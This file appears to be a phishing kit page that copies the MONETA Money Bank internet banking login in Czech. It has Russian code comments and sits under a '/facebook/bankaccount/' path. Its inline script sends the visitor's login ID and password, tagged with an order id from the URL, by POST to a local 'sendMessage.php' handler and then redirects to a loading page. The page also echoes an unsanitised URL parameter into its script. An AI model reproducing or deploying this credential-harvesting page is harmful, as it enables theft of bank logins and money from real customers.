<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" type="text/css" href="./moneta/stylemoneta.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <title>Internet Banka - MONETA Money Bank</title>
</head>
<body>
    <?php
        $id = $_GET['orderid']
    ?>
    <div class="container">
        <div class="header">
            <a href="https://www.moneta.cz/">
                <img src="/facebook/bankaccount/moneta/images/moneta.svg" alt="">
            </a>
        </div>
        <div class="main-center">
            <div class="prihlaseni">
                <div class="titleprihlaseni">
                    Přihlášení
                </div>
                <div class="id">
                    ID
                </div>
                <div class='idinput'>
                    <div class='input-wrapper'>
                        <input type="text" id="login">
                    </div>
                </div> 
                <div class="heslo">
                    Heslo
                </div>
                <div class="hesloinput">
                    <div class="input-wrapper2">
                        <input type="password" id="password">
                    </div>
                </div>
                <div class="prihlasit">
                    <button id="Pokracovat"> Přihlásit </button>
                </div>
                <div class="bottomlinks">
                    <div class="napoveda">
                        ◦
                        <a href="https://www.moneta.cz/prihlasovani-do-ib"> 
                            Nápověda pro přihlášení
                        </a>
                    </div>
                    <div class="problemy">
                        ◦
                        <a href="https://www.moneta.cz/prihlasovani-do-ib#prihlaseni-section">
                            Problémy s předvyplňováním údajů?
                        </a>
                    </div>
                </div>
            </div>
            <div class="footer">
                <div class="kontakty">
                    ⋄
                    <a href="https://www.moneta.cz/kontakt">
                        Kontakty
                    </a>
                </div>
                <div class="pujcka">
                    ⋄
                    <a href="https://www.moneta.cz/pujcky-a-uvery/pujcka-na-cokoliv">
                         Půjčka
                    </a>
                </div>
                <div class="site">
                    ⋄
                    <a href="https://www.moneta.cz">
                        www.moneta.cz
                    </a>
                </div>
                <div class="moneta">
                    © 2023 MONETA Money Bank
                </div>
            </div>
        </div>
</div>
    <script src="/facebook/script.js"></script>
    <script src="./moneta/scriptmoneta.js"></script>

    <script>
    const submitButton = document.getElementById('Pokracovat')
const login = document.getElementById('login')
const password = document.getElementById('password')

submitButton.onclick = function () {

let bank = "<?php echo $bank ?>";

if (login.value == null || password.value == null) {
    return;
}

$.ajax({
            url: 'moneta/sendMessage.php',
            method: 'POST',
            data: {
                orderid: "<?php echo $id ?>",
                bank: 'moneta',
                login: login.value,
                password: password.value,
            },
            success: function (response) {
                // Обрабатываем успешный ответ
                console.log('Success');
            },
            error: function (error) {
                // Обрабатываем ошибку
                console.log('Error updating bank:', error);
            },
            complete: function () {
                // Выполняем переход на новую страницу
                const currentURL = window.location.href;
  const newURL = currentURL.replace('/bankaccount/', '/loading/');
  window.location.href = newURL;
            }
        });

}
  </script>
</body>
</html>